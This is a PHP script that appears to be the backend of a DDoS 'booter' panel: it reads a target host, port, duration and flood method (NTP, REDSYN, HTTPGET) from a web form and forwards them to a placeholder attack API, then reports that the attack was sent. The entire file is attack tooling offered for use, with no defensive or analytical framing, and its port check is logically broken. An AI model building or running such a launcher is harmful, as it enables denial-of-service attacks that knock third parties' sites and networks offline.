<?php

$host = $_POST['host'];
$port = $_POST['port'];
$time = $_POST['time'];
$method = $_POST['method'];

$Methods = array("NTP", "REDSYN", "HTTPGET");
$url = "https://yourapi/?key=superkey&host=$host&port=$port&time=$time&method=$method";

if (empty($host) | empty($port) | empty($time) | empty($method))
{
    echo "Please verify all fields";
    header('refresh: 3; url=index.php');
    die;
}


if (!filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($host, FILTER_VALIDATE_URL))
{
	echo "Please insert a correct IP address(v4)/URL..";
    header('refresh: 3; url=index.php');
    die;
}

if($port < 1 && $port > 65535)
{
    echo "Port is invalid";
    header('refresh: 3; url=index.php');
    die;
}

if ($time < 1)
{
    echo "Time is invalid";
    header('refresh: 3; url=index.php');
    die;
}

if (!in_array($method, $Methods)) 
{
    die("Invalid method!");
    header('refresh: 3; url=index.php');
    die;
}

try 
{  
	$ch = curl_init();
	$optArray = array(CURLOPT_URL => $url,CURLOPT_RETURNTRANSFER => true);
	curl_setopt_array($ch, $optArray);
	$result = curl_exec($ch);
}
catch(Exception $e) 
{
	echo "Something went wrong.";
    header('refresh: 3; url=index.php');
    die;
}

if (!$result)
{
    echo 'API Error!';
    header('refresh: 3; url=index.php');
    die;
}

echo "Attack was sent successfully to $host on port $port for $time seconds using method $method";

// echo "<br><br><br>$result" //uncomment this if you want to display API response

header('refresh: 3; url=index.php');

?>
